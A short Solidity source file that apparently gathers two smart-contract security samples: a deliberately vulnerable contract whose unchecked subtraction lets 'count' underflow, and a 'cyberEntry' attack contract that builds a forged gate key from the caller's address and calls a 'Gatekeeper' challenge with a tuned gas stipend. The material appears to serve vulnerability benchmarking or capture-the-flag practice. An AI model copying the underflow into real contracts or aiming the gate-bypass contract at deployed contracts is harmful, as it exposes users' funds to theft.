 

 
 

pragma solidity ^0.4.23;

contract IntegerOverflowMultiTxMultiFuncFeasible {
    uint256 private initialized = 0;
    uint256 public count = 1;

    function init() public {
        initialized = 1;
    }

    function run(uint256 input) {
        if (initialized == 0) {
            return;
        }
         
        count -= input;
    }
}

contract cyberEntry {
    address public gkAddress;

    Gatekeeper gk; 

    function cyberEntry(address _gkAddress) public {
        gkAddress = _gkAddress;
        gk = Gatekeeper(gkAddress);
    }

    function enter(bytes32 passphrase) public {
        uint256 stipend = 483657;
        
        uint256 key;
        uint256 upper;
        uint256 lower;

        upper = uint256(bytes4("cool")) << 32;
        lower = uint256(uint16(msg.sender));

        key = upper | lower;

        gk.enter.gas(stipend)(passphrase, bytes8(key));
    }
}

interface Gatekeeper {
    function enter(bytes32 _passcode, bytes8 _gateKey) public returns (bool);
}
